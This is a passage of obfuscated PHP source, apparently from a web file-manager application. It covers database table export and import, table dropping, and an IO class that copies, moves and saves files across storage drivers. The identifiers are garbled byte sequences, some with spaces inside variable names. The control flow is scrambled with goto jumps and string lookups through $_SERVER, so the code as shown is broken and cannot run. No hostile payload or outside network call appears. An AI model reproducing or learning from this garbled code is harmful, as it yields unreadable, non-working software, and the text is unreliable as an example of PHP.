$Cï–ù¶­ôÃ->update(1); } } $this->taskToCache($Cï–ù¶­ôÃ); } public function insertTable($f©¼™¡åª, $c¾¨ñİÔ¸† = null) { $Eµ¯îÉÃ¹ =& $_SERVER[òÀöí]; $f«œ—­×ôµ = $this->model()->db(); $A¢à¥ìÌíº = $eİ’œÇ‰Ôã ? array($eİ’œÇ‰Ôã) : $f«œ—­×ôµ->getTables(); foreach ($f©¼™¡åª as $A÷‹ªîŒ¤ç) { $eİ’œÇ‰Ôã = basename($A÷‹ªîŒ¤ç, $Eµ¯îÉÃ¹[736]); if (!in_array($eİ’œÇ‰Ôã, $A¢à¥ìÌíº)) { continue; } if ($c¾¨ñİÔ¸†) { $c¾¨ñİÔ¸†->task[$Eµ¯îÉÃ¹[1002]] = $eİ’œÇ‰Ôã; } if (get_filesize($A÷‹ªîŒ¤ç) == 0) { continue; } $a£å÷Ê×àé = $this->sqlToDb($A÷‹ªîŒ¤ç, $c¾¨ñİÔ¸†); if (!$a£å÷Ê×àé) { ActionCall($Eµ¯îÉÃ¹[997], !0, 0); show_json(LNG($Eµ¯îÉÃ¹[1003]) . "\x5b{$eİ’œÇ‰Ôã}\135", !1); } } $this->taskToCache($c¾¨ñİÔ¸†); } public function sqlFromDb($fó‚Ç¦«Ì, $F¢ÛŞ±ÑÕ, $BËº­©ÓƒŠ = null, $Bµƒ½™¨À¯ = null) { goto fğŒ”··›; añåÇ“: $AÎ¹‡Óß¬… = $BÖÍó ›îä->getPk(); $Aõ‡Â… Ø = $BÖÍó ›îä->getDbFields(); do { $E‚ç©Ğ„ˆÆ = $BÖÍó ›îä->field($Aõ‡Â… Ø)->order($AÎ¹‡Óß¬… . $_SERVER[òÀöí][1005])->selectPage($Aù‹ŸËÕÉƒ, $EëÆæõİƒù); $cŒÌğ§ˆ« = isset($E‚ç©Ğ„ˆÆ[$_SERVER[òÀöí][360]][$_SERVER[òÀöí][362]]) ? $E‚ç©Ğ„ˆÆ[$_SERVER[òÀöí][360]][$_SERVER[òÀöí][362]] : 0; $A»·ï°¾æ = !empty($E‚ç©Ğ„ˆÆ[$_SERVER[òÀöí][363]]) ? $E‚ç©Ğ„ˆÆ[$_SERVER[òÀöí][363]] : array(); if (!($C¹æÁ“Åâ¾ = count($A»·ï°¾æ))) { break; } $A½™æ¬Ÿ¬ó = array(); foreach ($A»·ï°¾æ as $aµ½ãÒÉñ) { if ($fó‚Ç¦«Ì == $_SERVER[òÀöí][1006] && $aµ½ãÒÉñ[$_SERVER[òÀöí][29]] == $_SERVER[òÀöí][1007]) { $b‰Ë¶¹éË¦ = json_decode($aµ½ãÒÉñ[$_SERVER[òÀöí][368]], !0); if ($b‰Ë¶¹éË¦[$_SERVER[òÀöí][28]] == date($_SERVER[òÀöí][709]) && !$b‰Ë¶¹éË¦[$_SERVER[òÀöí][708]]) { continue; } } if ($Bµƒ½™¨À¯) { $aµ½ãÒÉñ[$_SERVER[òÀöí][75]] = "\x7b\x69\x6f\72{$Bµƒ½™¨À¯}\175" . substr($aµ½ãÒÉñ[$_SERVER[òÀöí][75]], strlen("\173\x69\157\72{$aµ½ãÒÉñ[$_SERVER[òÀöí][770]]}\x7d")); $aµ½ãÒÉñ[$_SERVER[òÀöí][770]] = $Bµƒ½™¨À¯; } $A½™æ¬Ÿ¬ó[] = $_SERVER[òÀöí][1008] . $this->sqlEncode($aµ½ãÒÉñ) . $_SERVER[òÀöí][1009]; } $aÖâğÙ = "\111\x4e\123\x45\122\124\x20\x49\116\x54\117\x20\140{$fó‚Ç¦«Ì}\140\x20\x28\140" . implode($_SERVER[òÀöí][1010], $Aõ‡Â… Ø) . $_SERVER[òÀöí][1011]; fwrite($D Ğ˜›®è³, $aÖâğÙ . implode($_SERVER[òÀöí][1012], $A½™æ¬Ÿ¬ó) . $_SERVER[òÀöí][67] . PHP_EOL); $EëÆæõİƒù++; $añé‘¬† += $C¹æÁ“Åâ¾; if ($BËº­©ÓƒŠ) { $BËº­©ÓƒŠ->update($C¹æÁ“Åâ¾); } } while ($EëÆæõİƒù <= $cŒÌğ§ˆ«); goto C©ç„¶Ãô; cË¥‘Ê¯¢: $EëÆæõİƒù = 1; $Aù‹ŸËÕÉƒ = 500; $D Ğ˜›®è³ = fopen($F¢ÛŞ±ÑÕ, $_SERVER[òÀöí][1004]); goto añåÇ“; C©ç„¶Ãô: fclose($D Ğ˜›®è³); return $añé‘¬†; goto cÍœ—ŞĞÌ; fğŒ”··›: if ($BËº­©ÓƒŠ) { $BËº­©ÓƒŠ->task[$_SERVER[òÀöí][1002]] = $fó‚Ç¦«Ì; } $BÖÍó ›îä = $this->model($fó‚Ç¦«Ì); $añé‘¬† = 0; goto cË¥‘Ê¯¢; cÍœ—ŞĞÌ: } public function sqlToDb($F…å”‡Ñ¦ó, $Dò”«©‡«‘ = null) { goto E÷åÀ‰œ¬; E÷åÀ‰œ¬: $béÃ¬©îÇ½ =& $_SERVER[òÀöí]; $e¬‹ƒÇ„³â = $this->model()->db(); $F¼ÕÂ‘›ˆµ = @fopen($F…å”‡Ñ¦ó, $béÃ¬©îÇ½[1013]); goto d‘Á‹ç«§é; Déã‚Òİ: if (trim($bÖŸ×Ü¾êŒ)) { $bÖŸ×Ü¾êŒ = rtrim(trim($bÖŸ×Ü¾êŒ), $béÃ¬©îÇ½[67]); if (!$e¬‹ƒÇ„³â->execute($bÖŸ×Ü¾êŒ)) { return !1; } if ($Dò”«©‡«‘) { $Dò”«©‡«‘->update($E™µ­¥±Ãë - 1); } } return !0; goto e§Åï²ì¥; Fïç‘‰œµæ: $dñ†¶µ·„º = 500 + 1; while (!feof($F¼ÕÂ‘›ˆµ)) { if ($Dò”«©‡«‘ && $E™µ­¥±Ãë != 0) { $Dò”«©‡«‘->task[$béÃ¬©îÇ½[1000]] += 1; } $E™µ­¥±Ãë++; $fÈ˜óòÚé× = trim(fgets($F¼ÕÂ‘›ˆµ)); $bÖŸ×Ü¾êŒ .= $béÃ¬©îÇ½[50] . $this->sqlDecode($fÈ˜óòÚé×, $this->type); if ($E™µ­¥±Ãë == $dñ†¶µ·„º) { $bÖŸ×Ü¾êŒ = rtrim(trim($bÖŸ×Ü¾êŒ), $béÃ¬©îÇ½[67]); if (!$e¬‹ƒÇ„³â->execute($bÖŸ×Ü¾êŒ)) { return !1; } if ($Dò”«©‡«‘) { $Dò”«©‡«‘->update($E™µ­¥±Ãë - 1); } $bÖŸ×Ü¾êŒ = $béÃ¬©îÇ½[33]; $E™µ­¥±Ãë = 0; } } fclose($F¼ÕÂ‘›ˆµ); goto Déã‚Òİ; d‘Á‹ç«§é: if (!$F¼ÕÂ‘›ˆµ) { return !1; } $E™µ­¥±Ãë = 0; $bÖŸ×Ü¾êŒ = $béÃ¬©îÇ½[33]; goto Fïç‘‰œµæ; e§Åï²ì¥: } public function dropTable($BŒàùËØÒš = null) { $C“Ì›ÍËæŸ = $this->model()->db(); $F·©†‰è¦Í = $BŒàùËØÒš ? array($BŒàùËØÒš) : $C“Ì›ÍËæŸ->getTables(); if (!$F·©†‰è¦Í) { return; } foreach ($F·©†‰è¦Í as $BŒàùËØÒš) { $C“Ì›ÍËæŸ->execute("\144\x72\x6f\160\x20\x74\141\142\x6c\x65\40\x69\146\40\145\x78\x69\x73\x74\163\40\140{$BŒàùËØÒš}\x60"); } } private function taskToCache($BóØô«‰¹Ô = null) { $Cì«‹ÑÎ =& $_SERVER[òÀöí]; if (!$BóØô«‰¹Ô) { return; } $cƒä ‰İÍ = array($Cì«‹ÑÎ[1002] => $BóØô«‰¹Ô->task[$Cì«‹ÑÎ[1002]], $Cì«‹ÑÎ[1000] => $BóØô«‰¹Ô->task[$Cì«‹ÑÎ[1000]], $Cì«‹ÑÎ[1014] => $BóØô«‰¹Ô->task[$Cì«‹ÑÎ[1014]]); if ($cƒä ‰İÍ[$Cì«‹ÑÎ[1000]] == $cƒä ‰İÍ[$Cì«‹ÑÎ[1014]]) { $cƒä ‰İÍ[$Cì«‹ÑÎ[715]] = 1; } Cache::set($Cì«‹ÑÎ[1015] . $BóØô«‰¹Ô->task[$Cì«‹ÑÎ[385]], $cƒä ‰İÍ); $BóØô«‰¹Ô->end(); } private function sqlEncode($F‘šãã«) { $Dê÷§öª”ê =& $_SERVER[òÀöí]; $Bà˜®ƒºÍ„ = array(); foreach ($F‘šãã« as $F®Ú§©—­¤) { if (is_array($F®Ú§©—­¤)) { $F®Ú§©—­¤ = json_encode_force($F®Ú§©—­¤); } $F®Ú§©—­¤ = addslashes($F®Ú§©—­¤); $F®Ú§©—­¤ = str_replace(array($Dê÷§öª”ê[1016], $Dê÷§öª”ê[227]), array($Dê÷§öª”ê[1017], $Dê÷§öª”ê[1018]), $F®Ú§©—­¤); $Bà˜®ƒºÍ„[] = str_replace($Dê÷§öª”ê[55], $Dê÷§öª”ê[1019], $F®Ú§©—­¤); } return $Dê÷§öª”ê[55] . implode($Dê÷§öª”ê[1020], $Bà˜®ƒºÍ„) . $Dê÷§öª”ê[55]; } private function sqlDecode($Få³¤ç„¸Î, $d‡ì¢Ì”•¯) { $cˆË³ÏÖ‰ =& $_SERVER[òÀöí]; $Få³¤ç„¸Î = str_replace(array($cˆË³ÏÖ‰[1017], $cˆË³ÏÖ‰[1018]), array($cˆË³ÏÖ‰[1016], $cˆË³ÏÖ‰[227]), $Få³¤ç„¸Î); if ($d‡ì¢Ì”•¯ == $cˆË³ÏÖ‰[9]) { $Få³¤ç„¸Î = stripslashes($Få³¤ç„¸Î); } return $Få³¤ç„¸Î; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bõ¥å¾¹, $B‰ŞÏ«ëøò) { goto Dœ‡Ô…ÂÕÎ; e©‚âÂÃİ: Hook::trigger($F­Ü°Óè˜[1022] . $bõ¥å¾¹ . $F­Ü°Óè˜[1025], $e‹ÅÚÃˆ£, $C¥×ºÇ¤Ä); return $C¥×ºÇ¤Ä; goto b»Üìµ£³ï; BÏ¤½±Ìœ¶: Hook::trigger($F­Ü°Óè˜[1022] . $bõ¥å¾¹ . $F­Ü°Óè˜[1023], $e‹ÅÚÃˆ£); $Eİ‡™¹¾ñˆ = self::driverMake($B‰ŞÏ«ëøò[0]); if (method_exists($Eİ‡™¹¾ñˆ, $bõ¥å¾¹)) { $C¥×ºÇ¤Ä = @call_user_func_array(array($Eİ‡™¹¾ñˆ, $bõ¥å¾¹), $B‰ŞÏ«ëøò); } else { if (method_exists($Eİ‡™¹¾ñˆ, $F­Ü°Óè˜[1024])) { $C¥×ºÇ¤Ä = @call_user_func_array(array($Eİ‡™¹¾ñˆ, $bõ¥å¾¹), $B‰ŞÏ«ëøò); } else { if (method_exists(self, $bõ¥å¾¹)) { $C¥×ºÇ¤Ä = @call_user_func_array(array(self, $bõ¥å¾¹), $B‰ŞÏ«ëøò); } else { $C¥×ºÇ¤Ä = call_user_func_array(array(parent, $bõ¥å¾¹), $B‰ŞÏ«ëøò); } } } goto e©‚âÂÃİ; Dœ‡Ô…ÂÕÎ: $F­Ü°Óè˜ =& $_SERVER[òÀöí]; $e‹ÅÚÃˆ£ = $B‰ŞÏ«ëøò; $GLOBALS[$F­Ü°Óè˜[1021]] = $F­Ü°Óè˜[1022] . $bõ¥å¾¹; goto BÏ¤½±Ìœ¶; b»Üìµ£³ï: } public static function init($e‡ˆ”Ş‡­õ) { return self::driverMake($e‡ˆ”Ş‡­õ); } public static function copy($DËÁàÓ«¡, $AƒØÛøÊéÑ, $Dæ•ïƒã¿ = false, $E³¤à´å„ = false) { return self::copyMoveStart($DËÁàÓ«¡, $AƒØÛøÊéÑ, $Dæ•ïƒã¿, $_SERVER[òÀöí][507], $E³¤à´å„); } public static function move($b±çÙ‘ššæ, $b†åˆÑ¸ãõ, $fˆ÷©ƒÀ·ã = false, $a½ÁŠ±ñ¹ = false) { return self::copyMoveStart($b±çÙ‘ššæ, $b†åˆÑ¸ãõ, $fˆ÷©ƒÀ·ã, $_SERVER[òÀöí][509], $a½ÁŠ±ñ¹); } private static function copyMoveStart($aÁ‚šÉÚ¶Ä, $då£Ìà´‡, $còÈÌçôŸ¢, $EĞ¥­Ã·Ÿ, $B¬Í‘œÃ¢ø) { $Eííëİ‰Ö =& $_SERVER[òÀöí]; $Dá•Æ’’ = array($aÁ‚šÉÚ¶Ä, $då£Ìà´‡, $còÈÌçôŸ¢, $B¬Í‘œÃ¢ø); Hook::trigger($Eííëİ‰Ö[1022] . $EĞ¥­Ã·Ÿ . $Eííëİ‰Ö[1023], $Dá•Æ’’); $Fä°ºá–İ = self::copyMove($aÁ‚šÉÚ¶Ä, $då£Ìà´‡, $còÈÌçôŸ¢, $EĞ¥­Ã·Ÿ, $B¬Í‘œÃ¢ø); Hook::trigger($Eííëİ‰Ö[1022] . $EĞ¥­Ã·Ÿ . $Eííëİ‰Ö[1025], $Dá•Æ’’, $Fä°ºá–İ); return $Fä°ºá–İ; } public static function saveFile($DÇÈöùø, $B½Œ†‹®Ñ‹, $b¡—éµã = true) { goto bÇÉ×‡ï×º; dÌ‘˜Ä÷É‡: $bóº‚‡à = $FùôŠó¢ÊÓ->pathFather($B½Œ†‹®Ñ‹); $C¶“ÖºÜÜ = !0; if (!$b¡—éµã && self::driverIsSame($a¾šàµˆô, $FùôŠó¢ÊÓ)) { $C¶“ÖºÜÜ = !1; } goto c–¨ˆŸÅŒĞ; FŒôˆ£¿¨Ë: $FùôŠó¢ÊÓ = self::driverMake($B½Œ†‹®Ñ‹); $B“•òÖèÆØ = !1; if ($FùôŠó¢ÊÓ->pathParse[$eÅæ­±¤[1026]]) { $fÜ—‘»éæ· = $FùôŠó¢ÊÓ->pathParse[$eÅæ­±¤[1026]]; $B“•òÖèÆØ = $FùôŠó¢ÊÓ; $FùôŠó¢ÊÓ = self::driverMake($fÜ—‘»éæ·); } goto dÌ‘˜Ä÷É‡; bÇÉ×‡ï×º: $eÅæ­±¤ =& $_SERVER[òÀöí]; $f®‹´¶Ş = self::info($B½Œ†‹®Ñ‹); $a¾šàµˆô = self::driverMake($DÇÈöùø); goto FŒôˆ£¿¨Ë; c–¨ˆŸÅŒĞ: $C¨‹öˆŞ = self::copyFile($a¾šàµˆô, $DÇÈöùø, $FùôŠó¢ÊÓ, $bóº‚‡à, $f®‹´¶Ş[$eÅæ­±¤[28]], $C¶“ÖºÜÜ); if ($B“•òÖèÆØ) { $C¨‹öˆŞ = $B“•òÖèÆØ->getPathOuter($C¨‹öˆŞ); } return $C¨‹öˆŞ; goto c·²³¶¼´‹; c·²³¶¼´‹: } private static function copyMove($F¹‡”šŸ«¦, $cø¶ôïØÛ, $C˜º ô—‘ø, $CŒ†ë“Æš, $Fñç»½½Îö = false) { goto A½ ‘ëÛ‡Î; f­·ß‚‰¬£: Hook::trigger($fµ²¤ù¾«[72], $eÕ‚©÷Ö¿, $F¹‡”šŸ«¦, $C¬äğÀ¦Ö¾, $cø¶ôïØÛ); $e©¦ºŒŒ = self::driverIsSame($eÕ‚©÷Ö¿, $C¬äğÀ¦Ö¾); if ($e©¦ºŒŒ) { if ($CŒ†ë“Æš == $fµ²¤ù¾«[509] && !method_exists($C¬äğÀ¦Ö¾, $fµ²¤ù¾«[1027]) && trim($cø¶ôïØÛ, $fµ²¤ù¾«[8]) == trim($C¬äğÀ¦Ö¾->pathFather($F¹‡”šŸ«¦), $fµ²¤ù¾«[8])) { if ($eÕ‚©÷Ö¿->pathThis($F¹‡”šŸ«¦) != $Fñç»½½Îö && !$eÕ‚©÷Ö¿->isTypeObject()) { return $eÕ‚©÷Ö¿->rename($F¹‡”šŸ«¦, $Fñç»½½Îö); } return $C¬äğÀ¦Ö¾->getPathOuter($F¹‡”šŸ«¦); } if (method_exists($C¬äğÀ¦Ö¾, $CŒ†ë“Æš)) { return $C¬äğÀ¦Ö¾->{$CŒ†ë“Æš}($F¹‡”šŸ«¦, $cø¶ôïØÛ, $C˜º ô—‘ø); } } goto E˜Ä¤»Ç; A’àï™ƒ: if ($A§³º¥—ˆÛ) { $Cƒ„†Šˆ = $A§³º¥—ˆÛ->getPathOuter($Cƒ„†Šˆ); } return $Cƒ„†Šˆ; goto e£ãŒô±ÈŠ; fõàÆÒí: $eÕ‚©÷Ö¿ = self::driverMake($F¹‡”šŸ«¦); $C¬äğÀ¦Ö¾ = self::driverMake($cø¶ôïØÛ); $AÇ¯İÅ£ï = $CŒ†ë“Æš == $fµ²¤ù¾«[509]; goto fÄğ ™äÇŞ; E˜Ä¤»Ç: $Fõ†ÒªøÖ = $eÕ‚©÷Ö¿->isFile($F¹‡”šŸ«¦); if (!$Fõ†ÒªøÖ && $C¬äğÀ¦Ö¾->getType() == $fµ²¤ù¾«[713] && $eÕ‚©÷Ö¿->getType() == $fµ²¤ù¾«[105]) { $Cƒ„†Šˆ = $C¬äğÀ¦Ö¾->copyFolderFromIO($eÕ‚©÷Ö¿, $F¹‡”šŸ«¦, $cø¶ôïØÛ, $C˜º ô—‘ø, $AÇ¯İÅ£ï, $Fñç»½½Îö); } else { $Cƒ„†Šˆ = self::copyPath($eÕ‚©÷Ö¿, $F¹‡”šŸ«¦, $C¬äğÀ¦Ö¾, $cø¶ôïØÛ, $C˜º ô—‘ø, $AÇ¯İÅ£ï, $Fõ†ÒªøÖ, $Fñç»½½Îö); } if ($Cƒ„†Šˆ && $AÇ¯İÅ£ï) { $eÕ‚©÷Ö¿->remove($F¹‡”šŸ«¦); } goto A’àï™ƒ; fÄğ ™äÇŞ: $A§³º¥—ˆÛ = !1; if ($C¬äğÀ¦Ö¾->pathParse[$fµ²¤ù¾«[1026]]) { $cø¶ôïØÛ = $C¬äğÀ¦Ö¾->pathParse[$fµ²¤ù¾«[1026]]; $A§³º¥—ˆÛ = $C¬äğÀ¦Ö¾; $C¬äğÀ¦Ö¾ = self::driverMake($cø¶ôïØÛ); } self::check($eÕ‚©÷Ö¿, $F¹‡”šŸ«¦, $C¬äğÀ¦Ö¾, $cø¶ôïØÛ); goto f­·ß‚‰¬£; A½ ‘ëÛ‡Î: $fµ²¤ù¾« =& $_SERVER[òÀöí]; if (!$F¹‡”šŸ«¦ || $F¹‡”šŸ«¦ == $fµ²¤ù¾«[8] || !$cø¶ôïØÛ) { return !1; } ignore_timeout(); goto fõàÆÒí; e£ãŒô±ÈŠ: } private static function check($c™”¥È‡Ä³, $bè‹‚çÎ‡, $CÑ‡ª™ÑÅ, &$eÉ‡µ°Û‹Ç) { $A™¿¹Î¸ìÓ =& $_SERVER[òÀöí]; if (self::driverIsSame($c™”¥È‡Ä³, $CÑ‡ª™ÑÅ) && $c™”¥È‡Ä³->isFolder($bè‹‚çÎ‡) && $c™”¥È‡Ä³->isParentOf($bè‹‚çÎ‡, $eÉ‡µ°Û‹Ç)) { show_json(LNG($A™¿¹Î¸ìÓ[1028]), !1); } if (!$c™”¥È‡Ä³->exist($bè‹‚çÎ‡)) { show_json(LNG($A™¿¹Î¸ìÓ[104]), !1); } } private static function copyPath($eÜ¾Ü‡“, $c£¥ã¦†´, $E¹¡×Ò¶š¾, $e»ˆì¯¼‘, $C…‰µ–á¡Ô, $eÆ÷Ó™‰—à, $f×‘—œ¹, $eõéµÅ“ = false) { goto F„²îÅ„»İ; añÊ‰Ÿ…Ì: if ($f×‘—œ¹) { return self::copyFile($eÜ¾Ü‡“, $c£¥ã¦†´, $E¹¡×Ò¶š¾, $e»ˆì¯¼‘, $F³¨÷ãâ, $eÆ÷Ó™‰—à); } if ($C…‰µ–á¡Ô == REPEAT_RENAME_FOLDER) { $C…‰µ–á¡Ô = !1; } $D¨‚¨Ï¸–¦ = rtrim($e»ˆì¯¼‘, $AÄ¾èµ¤[8]) . $AÄ¾èµ¤[8] . $F³¨÷ãâ; goto bÑòˆœ—éß; bÑòˆœ—éß: $BĞ¦ì“„µ¾ = $E¹¡×Ò¶š¾->mkdir($E¹¡×Ò¶š¾->getPath($D¨‚¨Ï¸–¦)); $e»ˆì¯¼‘ = $E¹¡×Ò¶š¾->getPathInner($BĞ¦ì“„µ¾); $EØÒçÎ„š = $eÜ¾Ü‡“->listPath($c£¥ã¦†´, !0); goto C´çö°òô; F„²îÅ„»İ: $AÄ¾èµ¤ =& $_SERVER[òÀöí]; $F³¨÷ãâ = $eõéµÅ“ ? $eõéµÅ“ : $eÜ¾Ü‡“->pathThis($c£¥ã¦†´); if ($C…‰µ–á¡Ô) { $A‚ğ¨£Ìˆ = $E¹¡×Ò¶š¾->fileNameExist($e»ˆì¯¼‘, $F³¨÷ãâ); $F³¨÷ãâ = $E¹¡×Ò¶š¾->fileNameAuto($e»ˆì¯¼‘, $F³¨÷ãâ, $C…‰µ–á¡Ô, !$f×‘—œ¹); $C…‰µ–á¡Ô = $A‚ğ¨£Ìˆ ? $C…‰µ–á¡Ô : !1; } goto añÊ‰Ÿ…Ì; C´çö°òô: $fÕß’¿Ó·« = array_merge($EØÒçÎ„š[$AÄ¾èµ¤[73]], $EØÒçÎ„š[$AÄ¾èµ¤[74]]); foreach ($fÕß’¿Ó·« as $cÆÅè¸ÀŸœ) { $AÎ¶¡åÛ = $cÆÅè¸ÀŸœ[$AÄ¾èµ¤[29]] == $AÄ¾èµ¤[173]; $c£¥ã¦†´ = $eÜ¾Ü‡“->getPathInner($cÆÅè¸ÀŸœ[$AÄ¾èµ¤[75]]); $b¼¨‰İìÁØ = self::copyPath($eÜ¾Ü‡“, $c£¥ã¦†´, $E¹¡×Ò¶š¾, $e»ˆì¯¼‘, $C…‰µ–á¡Ô, $eÆ÷Ó™‰—à, $AÎ¶¡åÛ); if (!$b¼¨‰İìÁØ) { IO::errorTips($AÄ¾èµ¤[1029] . $c£¥ã¦†´ . $AÄ¾èµ¤[66] . $e»ˆì¯¼‘); } } return $BĞ¦ì“„µ¾; goto cÛÌ”â‘ƒ±; cÛÌ”â‘ƒ±: } private static function copyFile($d¡·‘­İ±, $fƒĞì¦ùáÂ, $D–ñÒÈ‡˜, $C¼”“ÔƒØº, $EŞ’öá’ºó, $AÖÇ÷“Ã¤„) { goto B›¿…ã‘˜î; BœÈİš‰Ô·: Hook::trigger($bîá‘ÚŞ÷[1032], $d¡·‘­İ±, $fƒĞì¦ùáÂ, $D–ñÒÈ‡˜, $C¼”“ÔƒØº, $EŞ’öá’ºó, $dˆ›Œí…‘); return $dˆ›Œí…‘; goto båĞµëô˜ß; B›¿…ã‘˜î: $bîá‘ÚŞ÷ =& $_SERVER[òÀöí]; $C¼”“ÔƒØº = $D–ñÒÈ‡˜->getPath(rtrim($C¼”“ÔƒØº, $bîá‘ÚŞ÷[8]) . $bîá‘ÚŞ÷[8] . $EŞ’öá’ºó); $E…Œ—Ã¥µÉ = $bîá‘ÚŞ÷[1030] . time() . rand_string(5); goto f±¹„¿İ©; F¥–ÀåÈ¬: mk_dir($BŒªÇìâ§Ğ); $D¹Ñ‹‹ĞÂÙ = $BŒªÇìâ§Ğ . $E…Œ—Ã¥µÉ; $D¹Ñ‹‹ĞÂÙ = $d¡·‘­İ±->download($fƒĞì¦ùáÂ, $D¹Ñ‹‹ĞÂÙ); goto A¿²ùÚ«‘; f±¹„¿İ©: Hook::trigger($bîá‘ÚŞ÷[1031], $d¡·‘­İ±, $fƒĞì¦ùáÂ, $D–ñÒÈ‡˜, $C¼”“ÔƒØº, $EŞ’öá’ºó, $E…Œ—Ã¥µÉ); if (self::driverIsSame($d¡·‘­İ±, $D–ñÒÈ‡˜)) { if ($AÖÇ÷“Ã¤„) { $dˆ›Œí…‘ = $D–ñÒÈ‡˜->moveFile($fƒĞì¦ùáÂ, $C¼”“ÔƒØº); } else { $dˆ›Œí…‘ = $D–ñÒÈ‡˜->copyFile($fƒĞì¦ùáÂ, $C¼”“ÔƒØº); } Hook::trigger($bîá‘ÚŞ÷[1032], $d¡·‘­İ±, $fƒĞì¦ùáÂ, $D–ñÒÈ‡˜, $C¼”“ÔƒØº, $EŞ’öá’ºó, $dˆ›Œí…‘); return $dˆ›Œí…‘; } $BŒªÇìâ§Ğ = TEMP_FILES; goto F¥–ÀåÈ¬; A¿²ùÚ«‘: $D¹Ñ‹‹ĞÂÙ = $d¡·‘­İ±->iconvApp($D¹Ñ‹‹ĞÂÙ); $dˆ›Œí…‘ = $D–ñÒÈ‡˜->upload($C¼”“ÔƒØº, $D¹Ñ‹‹ĞÂÙ, $AÖÇ÷“Ã¤„); self::remove($BŒªÇìâ§Ğ . $E…Œ—Ã¥µÉ); goto BœÈİš‰Ô·; båĞµëô˜ß: } public static function pathFather($F¢Ô¿ÌŞ´Ì) { $EĞ„è°Ş˜Ø = IO::init($F¢Ô¿ÌŞ´Ì); $E‡¶Á¬ß”å = $EĞ„è°Ş˜Ø->pathFather($EĞ„è°Ş˜Ø->path); return $EĞ„è°Ş˜Ø->getPathOuter($E‡¶Á¬ß”å); } public static function fileOut($Bïè¯Ââ¥Î, $bœÔÊÚŸÙ = false, $eƒÂ‘»¢Œ = false, $B³Å’ÊÊ‹Ä = '') { $Aö¨ù®»ã = self::driverMake($Bïè¯Ââ¥Î); if ($Aö¨ù®»ã->isFileOutServer()) { return $Aö¨ù®»ã->fileOutServer($Bïè¯Ââ¥Î, $bœÔÊÚŸÙ, $eƒÂ‘»¢Œ, $B³Å’ÊÊ‹Ä); } return $Aö¨ù®»ã->fileOut($Bïè¯Ââ¥Î, $bœÔÊÚŸÙ, $eƒÂ‘»¢Œ, $B³Å’ÊÊ‹Ä); } public static function fileOutImage($d¬ÍÔ‹¸‘, $E‰‘¿ÌÇœù = 250) { $CÀ¼Ÿ­˜ªÉ = array(250, 600, 1200, 3000, 5000); for ($b„«öĞĞ†É = 0; $b„«öĞĞ†É < count($CÀ¼Ÿ­˜ªÉ); $b„«öĞĞ†É++) { if ($b„«öĞĞ†É == 0 && $E‰‘¿ÌÇœù <= $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]) { $E‰‘¿ÌÇœù = $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]; break; } else { if ($E‰‘¿ÌÇœù > $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É - 1] && $E‰‘¿ÌÇœù <= $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]) { $E‰‘¿ÌÇœù = $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]; break; } else { if ($b„«öĞĞ†É == count($CÀ¼Ÿ­˜ªÉ) - 1 && $E‰‘¿ÌÇœù > $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]) { $E‰‘¿ÌÇœù = $CÀ¼Ÿ­˜ªÉ[$b„«öĞĞ†É]; break; } } } } $a«ÑŞé’àë = self::driverMake($d¬ÍÔ‹¸‘); if ($a«ÑŞé’àë->isFileOutServer()) { return $a«ÑŞé’àë->fileOutImageServer($d¬ÍÔ‹¸‘, $E‰‘¿ÌÇœù); } return $a«ÑŞé’àë->fileOutImage($d¬ÍÔ‹¸‘, $E‰‘¿ÌÇœù); } private static function driverIsSame($E†‹îè´‘Ì, $D„‹ÎåÓî) { goto BÓ©À„¾ÌÏ; d±ƒíºù: if ($Eôò‹¸×¬± != $c¡¹¥Ä©¯) { return !1; } if ($Eôò‹¸×¬± == $E›ÙÙ¥òŠ‹[713]) { return !0; } if ($Eôò‹¸×¬± == $E›ÙÙ¥òŠ‹[105]) { return !0; } goto C„‡í­Í…ù; BÓ©À„¾ÌÏ: $E›ÙÙ¥òŠ‹ =& $_SERVER[òÀöí]; $Eôò‹¸×¬± = $E†‹îè´‘Ì->getType(); $c¡¹¥Ä©¯ = $D„‹ÎåÓî->getType(); goto d±ƒíºù; C„‡í­Í…ù: if ($E†‹îè´‘Ì->pathDriver == $D„‹ÎåÓî->pathDriver) { return !0; } return !1; goto Aİƒšİ²ÖØ; Aİƒšİ²ÖØ: } public static function copyUpdate($FÚò›è¨“¶, $C…„‹‰„´) { goto F×¶æó¡èë; F×¶æó¡èë: $eôà¿Œ­ =& $_SERVER[òÀöí]; if (!IO::exist($FÚò›è¨“¶)) { return !1; } if (!IO::exist($C…„‹‰„´)) { IO::mkdir($C…„‹‰„´); } goto c¶áè›Ú‘„; C‡ºÙ’ÍÊ: Hook::trigger($eôà¿Œ­[1036], $FÚò›è¨“¶, $C…„‹‰„´, $fÒèêˆİ); foreach ($cØà‹¾âÑ³ as $DÒƒé®«÷) { IO::mkdir($DÒƒé®«÷); } foreach ($e”ÚÚ¬„«² as $DÒƒé®«÷) { IO::copy($DÒƒé®«÷[$eôà¿Œ­[1033]], $DÒƒé®«÷[$eôà¿Œ­[1034]], REPEAT_REPLACE); } goto a¢‚Óìöêğ; f”ºæ·—Ğ²: $cØà‹¾âÑ³ = array(); foreach ($EŸç‰‡±‘ as $d¼ù¿‘¼Ø => $DÒƒé®«÷) { if (isset($fó‰¥ÈÑÚ[$d¼ù¿‘¼Ø])) { if ($DÒƒé®«÷[$eôà¿Œ­[76]] == 1) { continue; } if ($fó‰¥ÈÑÚ[$d¼ù¿‘¼Ø][$eôà¿Œ­[77]] == $DÒƒé®«÷[$eôà¿Œ­[77]]) { continue; } } if ($DÒƒé®«÷[$eôà¿Œ­[76]] == 1) { $cØà‹¾âÑ³[] = $C…„‹‰„´ . $eôà¿Œ­[8] . $d¼ù¿‘¼Ø; continue; } $F·Ê¥ÉğÊ = strstr(trim($d¼ù¿‘¼Ø, $eôà¿Œ­[8]), $eôà¿Œ­[8]) ? get_path_father($d¼ù¿‘¼Ø) : $eôà¿Œ­[33]; $e”ÚÚ¬„«²[] = array($eôà¿Œ­[1033] => $DÒƒé®«÷[$eôà¿Œ­[75]], $eôà¿Œ­[1034] => rtrim($C…„‹‰„´, $eôà¿Œ­[8]) . $eôà¿Œ­[8] . 